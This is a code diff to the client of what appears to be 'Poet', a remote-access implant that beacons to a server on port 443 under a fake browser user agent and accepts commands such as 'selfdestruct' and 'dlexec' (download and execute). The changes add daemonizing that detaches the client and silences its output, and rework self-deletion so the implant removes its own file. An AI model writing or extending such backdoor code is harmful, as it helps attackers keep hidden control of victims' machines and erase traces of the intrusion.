@@ -22,6 +22,11 @@ from poetsocket import *
 
 UA = 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
 
+if __file__.endswith('.py'):
+    CLIENT_PATH = os.path.abspath(__file__)
+else:
+    CLIENT_PATH = os.path.dirname(os.path.abspath(__file__))
+
 
 class PoetSocketClient(PoetSocket):
     def __init__(self, host, port):
@@ -74,15 +79,15 @@ class PoetClient(object):
                 elif inp == 'selfdestruct':
                     try:
                         # if the flag to delete client on launch wasn't given
-                        if not ARGS.delete:
-                            os.remove(ZIPPATH)
+                        if not args.delete:
+                            os.remove(CLIENT_PATH)
 
                         # check it's actually deleted
-                        if __file__.split('/')[-2] not in os.listdir(parent(ZIPPATH)):
+                        if os.path.exists(CLIENT_PATH):
+                            raise Exception('client not deleted')
+                        else:
                             s.send('boom')
                             sys.exit()
-                        else:
-                            raise Exception('client not deleted')
                     except Exception as e:
                         s.send(str(e.message))
                 elif inp.startswith('dlexec '):
@@ -146,7 +151,7 @@ class PoetClient(object):
 
         if inp == 'chint':
             # no arg, so just send back the interval
-            s.send(str(ARGS.interval))
+            s.send(str(args.interval))
         else:
             # set interval to arg
             try:
@@ -154,7 +159,7 @@ class PoetClient(object):
                 if num < 1 or num > 60*60*24:
                     msg = 'Invalid interval time.'
                 else:
-                    ARGS.interval = num
+                    args.interval = num
                     msg = 'done'
                 s.send(msg)
             except Exception as e:
@@ -251,6 +256,8 @@ def get_args():
     parser.add_argument('-v', '--verbose', action="store_true")
     parser.add_argument('-d', '--delete', action="store_true",
                         help="delete client upon execution")
+    parser.add_argument('--no-daemon', action='store_true',
+                        help="don't daemonize")
     return parser.parse_args()
 
 
@@ -283,32 +290,46 @@ def is_active(host, port):
     return False
 
 
-def parent(file):
-    """Returns filesystem parent."""
+def daemonize():
+    """Daemonize client. Methodology taken from
+    http://www-theorie.physik.unizh.ch/~dpotter/howto/daemonize
+    """
 
-    return os.path.abspath(file).rsplit('/', 1)[0]
+    # already a daemon?
+    if os.getppid() == 1:
+        return
+
+    pid = os.fork()
+    if pid != 0:
+        sys.exit(0)
+    os.umask(0022)
+    os.chdir('/')
+
+    devnull = open('/dev/null')
+    sys.stdout = devnull
+    sys.stdin = devnull
+    sys.stderr = devnull
 
 
 def main():
-    global ARGS, ZIPPATH
-    ARGS = get_args()
-    # path to zip file
-    ZIPPATH = parent(__file__)
+    global args
+    args = get_args()
+    if not args.no_daemon:
+        daemonize()
 
-    if ARGS.verbose:
+    if args.verbose:
         log.basicConfig(format='%(message)s', level=log.INFO)
     else:
         log.basicConfig(format='%(message)s')
 
-    if ARGS.delete:
+    if args.delete:
         log.info('[+] Deleting client.')
-        os.remove(ZIPPATH)
+        os.remove(CLIENT_PATH)
 
-    HOST = ARGS.host
-    PORT = int(ARGS.port) if ARGS.port else 443
+    HOST = args.host
+    PORT = int(args.port) if args.port else 443
 
-    log.info(('[+] Poet started with interval of {} seconds to port {}.' +
-              ' Ctrl-c to exit.').format(ARGS.interval, PORT))
+    log.info(('[+] Poet started with interval of {} seconds to port {}. Ctrl-c to exit.').format(args.interval, PORT))
 
     try:
         while True:
@@ -317,7 +338,7 @@ def main():
                 PoetClient(HOST, PORT).start()
             else:
                 log.info('[!] ({}) Server is inactive'.format(datetime.now()))
-            time.sleep(ARGS.interval)
+            time.sleep(args.interval)
     except KeyboardInterrupt:
         print
         log.info('[-] ({}) Poet terminated.'.format(datetime.now()))
